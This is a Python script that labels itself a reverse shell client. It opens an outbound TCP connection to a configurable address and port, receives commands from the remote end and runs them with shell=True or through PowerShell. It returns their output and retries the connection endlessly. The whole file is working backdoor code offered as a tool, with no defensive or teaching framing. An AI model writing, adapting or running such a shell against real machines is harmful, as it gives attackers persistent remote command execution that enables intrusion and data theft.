import os
import sys
import time
import socket
import argparse
import subprocess
import threading

def parse_address():
    parser = argparse.ArgumentParser(description="Reverse shell client")
    parser.add_argument('-a', '--address', default='127.0.0.1', help='IP address to connect to')
    parser.add_argument('-p', '--port', type=int, default=9999, help='Port to connect to')
    args = parser.parse_args()
    return args.address, args.port

def keep_alive(conn):
    while True:
        try:
            conn.send(b'\x00')
        except Exception:
            print("[-] Lost connection")
            print("[*] Trying to reconnect")
            conn.close()
            connect()
            break
        time.sleep(1)

def shell(conn):
    print("[+] Connected... :)")
    threading.Thread(target=keep_alive, args=(conn,), daemon=True).start()

    while True:
        try:
            path = os.getcwd()
            conn.sendall((path + ">").encode())

            cmd = b''
            while not cmd.endswith(b'\n'):
                part = conn.recv(1024)
                if not part:
                    raise Exception("Connection closed")
                cmd += part

            cmd = cmd.decode().strip()
            if not cmd:
                continue

            args = cmd.split()

            if args[0] == "cd":
                if len(args) == 1:
                    os.chdir(os.path.expanduser("~"))
                else:
                    try:
                        os.chdir(args[1])
                    except Exception as e:
                        conn.sendall(f"cd error: {e}\n".encode())

            elif args[0] == "exit":
                conn.close()
                sys.exit(0)

            elif args[0] == "help":
                conn.sendall(b"exit : exit terminal\n")

            else:
                if os.name == 'nt':
                    result = subprocess.run(["powershell", "/C", cmd], capture_output=True)
                else:
                    result = subprocess.run(cmd, shell=True, capture_output=True)
                conn.sendall(result.stdout + result.stderr)

        except Exception as e:
            print(f"[-] Closed... :( Reason: {e}")
            conn.close()
            connect()
            break

def connect():
    ip, port = parse_address()
    print(f"[-] Trying to connect to {ip}:{port}")
    while True:
        try:
            s = socket.create_connection((ip, port))
            shell(s)
            break
        except Exception:
            time.sleep(1)

if __name__ == "__main__":
    connect()
